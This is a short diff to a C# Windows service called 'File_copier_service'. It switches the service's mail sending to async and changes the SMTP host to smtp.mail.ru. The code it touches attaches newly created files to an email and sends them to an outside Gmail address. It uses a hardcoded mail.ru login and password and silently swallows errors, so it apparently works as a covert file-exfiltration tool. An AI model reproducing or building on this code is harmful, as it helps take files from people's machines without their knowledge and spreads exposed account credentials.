@@ -2,6 +2,7 @@
 using System.ServiceProcess;
 using System.IO;
 using System.Threading;
+using System.Threading.Tasks;
 using System.Net.Mail;
 using System.Net;
 
@@ -108,7 +109,7 @@ namespace File_copier_service
             }
         }
 
-        private void sendFile(string filePath)
+        private async void sendFile(string filePath)
         {
             MailAddress from = new MailAddress("service@yandex.ru", "bot");
             MailAddress to = new MailAddress("poiulkjhmnv50@gmail.com");
@@ -116,13 +117,13 @@ namespace File_copier_service
             m.Subject = "file_copier_service";
             m.Body = "new file created";
             m.Attachments.Add(new Attachment(filePath));
-            SmtpClient smtp = new SmtpClient("smtp.mail.com", 2525);
+            SmtpClient smtp = new SmtpClient("smtp.mail.ru", 465);
             smtp.EnableSsl = true;
             smtp.UseDefaultCredentials = false;
             smtp.Credentials = new NetworkCredential("info.bez17-21@mail.ru", "IN1234be");
             try
             {
-                smtp.Send(m);
+                await smtp.SendMailAsync(m);
             } 
             catch
             {}
